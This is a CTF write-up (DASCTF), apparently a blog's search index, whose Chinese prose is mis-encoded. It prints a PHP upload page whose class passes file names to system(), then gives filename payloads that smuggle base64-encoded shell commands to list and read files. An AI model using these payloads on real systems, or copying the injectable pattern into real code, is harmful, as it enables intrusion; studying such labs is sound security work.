class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;you are not admin!!!!!&#x27;);&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;&lt;!-- /y0u_cant_find_1t.zip --&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="title function_ invoke__">scandir</span>(<span class="string">&quot;.&quot;</span>) <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  &lt;form action=&quot;index.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">  é€‰æ‹©å›¾ç‰‡ï¼š&lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;&quot;&gt;</span></span><br><span class="line"><span class="string">  &lt;input type=&quot;submit&quot; value=&quot;ä¸Šä¼ &quot;&gt;&lt;/form&gt;</span></span><br><span class="line"><span class="string">  &#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]) &#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.(jpg|jpeg|gif|png|bmp)$/i&quot;</span>, <span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$filename</span>)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡ä¸Šä¼ æˆåŠŸ!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;failed&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">      <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;md5&quot;</span>)&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="title function_ invoke__">md5_file</span>(<span class="variable">$filename</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title function_ invoke__">FILE</span>(<span class="variable">$filename</span>);</span><br><span class="line">          <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;remove&quot;</span> &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] !== <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;../&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&#x27;&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=remove&#x27;&gt;remove&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;../index.php/?file=&quot;</span> . <span class="variable">$filename</span> . <span class="string">&quot;&amp;&amp;todo=show&#x27;&gt;show&lt;/a&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;remove&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">remove</span>();</span><br><span class="line">              <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;å›¾ç‰‡å·²åˆ é™¤!&#x27;);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>;</span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;todo&#x27;</span>] === <span class="string">&quot;show&quot;</span>) &#123;</span><br><span class="line">              <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></li><li><p>å®¡è®¡ä»£ç ï¼Œå‘ç°èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ã€‚å½“<code>$_SESSION[&#39;user&#39;]</code>ä¸ä¸ºç©ºä¸”<code>file</code>ä¸å­˜åœ¨æ—¶ï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œè€Œç™»å½•æˆåŠŸåï¼Œ<code>$_SESSION[&#39;user&#39;]</code>å°±ä¸ä¸ºç©ºäº†ã€‚</p></li><li><p>è¿›ä¸€æ­¥å‘ç°ï¼Œå½“<code>file</code>å˜é‡å­˜åœ¨æ—¶ï¼Œnewäº†ä¸€ä¸ª<code>FILE($filename);</code>ã€‚</p></li><li><p>æŸ¥çœ‹è¿™ä¸ªç±»ï¼Œå‘ç°è¿™ä¸ªç±»åœ¨<code>__destruct</code>æ—¶ä¼šå°†æ–‡ä»¶åå½“æˆå‘½ä»¤æ¥æ‰§è¡Œï¼Œè€Œä¸”åœ¨<code>__construct</code>æ—¶ï¼Œä¼šåˆ¤æ–­æ–‡ä»¶åæ˜¯å¦åªæœ‰ä¸€ä¸ª<code>.</code>ä¸”æ²¡æœ‰<code>/</code>ï¼ŒåŒæ—¶è¿˜ä¼šåˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lasttime</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\//i&quot;</span>, <span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$num</span> = <span class="title function_ invoke__">substr_count</span>(<span class="variable">$filename</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$num</span> != <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;???&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">filesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lasttime = <span class="title function_ invoke__">filemtime</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Filename: &quot;</span>. <span class="variable language_">$this</span>-&gt;filename. <span class="string">&quot;  Last Modified Time: &quot;</span>.<span class="variable language_">$this</span>-&gt;lasttime. <span class="string">&quot;  Filesize: &quot;</span>.<span class="variable language_">$this</span>-&gt;size.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls -all &quot;</span>.<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>äºæ˜¯ç¼–å†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¡µé¢ï¼ŒæŠ“åŒ…ï¼Œå¹¶å°†åŒ…ä¿®æ”¹ä¸€ä¸‹ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Type&quot;</span> <span class="attr">content</span>=<span class="string">&quot;text/html;charset=utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">400px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">2px</span> <span class="number">5px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">label</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;file&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ccc</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#4CAF50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">cursor</span>: pointer;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.form-group</span> <span class="selector-tag">input</span><span class="selector-attr">[type=<span class="string">&quot;submit&quot;</span>]</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#45a049</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://d4cdc047-fde9-4f75-99ce-4f8b8d0cb06c.node4.buuoj.cn:81/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>é€‰æ‹©æ–‡ä»¶<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;form-group&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ä¸Šä¼ &quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My4.png"></p></li><li><p>æ¥ç€å‘åŒ…ä¸¤æ¬¡ï¼Œå‡ºç°æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼Œæ¥ç€ä¿®æ”¹æ–‡ä»¶åä¸º<code>;ls;.jpg</code>ï¼Œä¸Šä¼ æˆåŠŸåï¼Œè®¿é—®<code>?file=;ls;.jpg</code>ï¼Œå‘ç°å¯ä»¥rceäº†ã€‚</p><p><img src="/DASCTF/My2.png"></p><p><img src="/DASCTF/My3.png"></p></li><li><p>å› ä¸º<code>.</code>å’Œ<code>/</code>ç”¨ä¸äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨echoå‘½ä»¤+åæ–œæ çš„æ–¹æ³•æ¥rceã€‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ¯”å¦‚ `echo éœ€è¦æ‰§è¡Œå‘½ä»¤çš„base64ç¼–ç  | base64 -d`</span><br><span class="line">ä¼ å…¥æ–‡ä»¶å ;`echo bHMgLw== | base64 -d`;.jpg ï¼Œå³å¯æˆåŠŸæŸ¥çœ‹æ ¹ç›®å½•ã€‚</span><br></pre></td></tr></table></figure><p><img src="/DASCTF/My6.png"></p><p><img src="/DASCTF/My5.png"></p></li><li><p>æœ€åä¸Šä¼ æ–‡ä»¶åä¸º</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;`echo Y2F0IC9hZGoq | base64 -d`;.jpg</span><br></pre></td></tr></table></figure><p>å³å¯å¾—åˆ°flagã€‚</p><p><img src="/DASCTF/My7.png"></p></li></ol><p>â€‹</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> write up </tag>
            
            <tag> WEB </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
